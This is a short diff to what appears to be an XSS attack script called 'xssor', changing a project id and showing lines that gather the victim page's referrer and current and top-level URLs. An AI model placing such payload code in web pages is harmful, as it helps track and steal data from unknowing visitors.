@@ -31,7 +31,7 @@ xssor.injscript = function (a, b) {
 };
 
 xssor.info = {};
-xssor.info.pid = 'abcdefg';
+xssor.info.pid = 'ywabbps';
 xssor.info.referrer = document.referrer;
 xssor.info.location = window.location.href;
 xssor.info.toplocation = top.location.href;
